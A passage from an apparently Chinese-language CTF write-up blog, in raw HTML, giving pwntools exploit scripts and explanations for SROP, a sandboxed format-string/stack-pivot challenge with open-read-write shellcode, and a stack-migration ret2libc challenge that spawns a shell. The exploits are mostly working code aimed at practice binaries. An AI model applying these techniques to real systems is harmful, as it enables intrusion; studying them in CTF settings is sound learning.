class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>syscall_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0401203</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x404100</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\"># read(0, data, 0x400)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_read</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rcx <span class=\"token operator\">=</span> <span class=\"token number\">0x400</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall_p</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'welcome to srop!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># execv(\"/bin/sh\",0,0)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x120</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rcx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> data</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall_p</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">0x120</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x120</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697302636618-0a0c686a-8a06-4b95-bed6-92f05f4586a7.png\" alt=\"getshell\"></p>\n<h1 id=\"orwrop\"><a class=\"markdownIt-Anchor\" href=\"#orwrop\">#</a> orw&amp;rop</h1>\n<p>orw, format_string<br>\n 开启了 canary，且开启了沙盒保护，无法运行 execve 的系统调用。<br>\n<img data-src=\"./1697306979068-64ee8366-e374-453d-9986-324c392091d9.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697307112260-42c0e67c-a4e5-42eb-9a4c-cf6c83539e77.png\" alt=\"image.png\"><br>\n 存在一段可读写执行的内存，即 0x66660000 处。因此可以在此处构造 shellcode，利用 open，read，write 三者将 flag 打印出来，为了允许栈顶的上下移动，这里取地址 <code>data = 0x66660800+0x30</code> 。<br>\n<img data-src=\"./1697307467750-b74290f4-65a4-425e-b0c4-185e6db67e54.png\" alt=\"image.png\"><br>\n 存在 printf 漏洞，可以用于泄露 canary 的值。然后利用第二个 read 实现栈溢出。<br>\n<img data-src=\"./1697307236301-ea52ed88-b628-45a2-97b1-9e411cde4bec.png\" alt=\"image.png\"><br>\n 没有可以利用的 Rop 链，所以无法手动构造 read 的参数实现往 data 处写入。因此利用栈迁移，payload 中对应栈上 rbp 处的内容设置为 data，而对应返回地址设置为主函数中 <code>read(0,buf,0x100);</code> ，即 0x40137D。其中 buf 为 rbp-0x30。因此此时执行的 read 函数会在 <code>data-0x30 = 0x66660800</code>  处写入数据。<br>\n<img data-src=\"./1697307656445-8ae8f2c3-7a8c-4a7c-a695-28eedc9487bd.png\" alt=\"image.png\"><img data-src=\"./1697307884075-1d8da5a5-eae8-4950-a2cb-d968d60b72dc.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697308574157-db202e6c-1487-44f1-8861-464f14260ae9.png\" alt=\"image.png\"><br>\n 这次写入到 0x66660800 处的数据，0x66660830 处对应 rbp，所以 0x66660838 即为返回地址。首先填充包括 canary 和 rbp 共 0x38 个字符，然后返回地址设为 0x66660840，后续接 shellcode，在该次 read 函数结束后便会执行 shellcode。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25201</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=process('./ezorw')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b read')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x030</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>start <span class=\"token operator\">=</span> <span class=\"token number\">0x401373</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rbp_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040121d</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x66660800</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Try to escape the sandbox\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'%11$p\\n'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the canary is %#x'</span><span class=\"token operator\">%</span>canary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I think you can get flag now\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#rbp data rsp oldrbp</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>assem<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mov rdi, 0x66660800;</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>mov rsi, 0;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mov rdx, 0;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mov rax, 0x2;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mov rdi, 3;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mov rsi, 0x66660a00;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mov rdx, 0x100;</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>mov rax, 0;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mov rdi, 1;</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>mov rax, 1;</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>syscall;</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I think you can get flag now\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/flag\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#rbp  rsp data+8</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"stack-migration-revenge\"><a class=\"markdownIt-Anchor\" href=\"#stack-migration-revenge\">#</a> stack migration revenge</h1>\n<p>栈迁移 ret2libc<br>\n 这次跟上周题相比，没有提前泄露栈上地址了。所以选择别处作为栈迁移处。这里依然选择 0x404000~0x405000 处可读写区段。取 <code>data=0x404800</code> 。<img data-src=\"./1697344386529-06337314-7904-47a7-9f87-fa3e1a570cae.png\" alt=\"image.png\"><br>\n 无后门无 syscall，用 ret2libc 的方式解题。所以要先泄露地址，然后执行函数。<br>\n如果用常规方式，rbp 设为 data，ret 设为 leave_ret，那么在迁移完之后，由于没有事先往 data 写入内容，因此程序会终止。因此这里不再利用 leave_ret 作为返回地址，而是取主函数中 read 函数部分作为返回地址。即 <code>read_1=0x4011FA</code> 。<br>\n<img data-src=\"./1697344673071-a792e17e-abf7-4e59-b9de-edd8e12cc58f.png\" alt=\"image.png\"><br>\n 这样当程序第一次返回时，rbp 寄存器设为 data，然后跳到 read_1 处执行 read 函数。而这里的 rsi 值会被设为 rbp+buf，而 buf 的值为 - 0x50，因此此时会往 buf-0x50 处写入数据。此时依旧遵循在 rbp 所指处存放旧 rbp，在 rbp+8 处存放返回地址。<br>\n<img data-src=\"./1697345399899-a73c9b8a-3de9-4316-b2ac-19ebf34c7358.png\" alt=\"image.png\"><br>\n 此时的 “栈” 的地址全部已知。因此直接在 data-0x50 处构建 payload，而返回地址设为 leave_ret，这样返回后会去执行 payload。这一步 payload 用于打印 <code>__libc_start_main</code>  的地址，其最后依旧返回至 read_1，毕竟 rdx 不好控制，就直接用刚刚的方法。其中，payload 开头的旧 rbp 需设为需要写入的地址 + 0x50。这里选择 <code>data+0x100</code> ，那么会往 <code>data+0xb0</code>  写入。<br>\n这时候开始构建 payload，开头的旧 rbp 已经没用了。先构建 <code>system(&quot;/bin/sh&quot;)</code> ，然后在其后放入字符串 <code>&quot;/bin/sh&quot;</code> ，这样是为了防止后面栈增长将字符串覆盖。payload 后面依旧是旧 rbp 指向 <code>data+0xb0</code> ，以及 leave_ret。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',27854)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b puts')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x04012b3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x4012b1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x050</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401227</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x404800</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>read_1 <span class=\"token operator\">=</span> <span class=\"token number\">0x4011FF</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'me:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'so funny\\n'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#rbp 404800 rsp old_rbp</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#read to 4047b0 </span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">-</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'so funny\\n'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#rbp 4047b0 rsp 404808</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#rbp 404900 rsp 4047b8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#read to 404710</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token operator\">-</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> offset</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token operator\">-</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#rbp 404710 rsp 404768</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#rbp 0 rsp 404718</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token 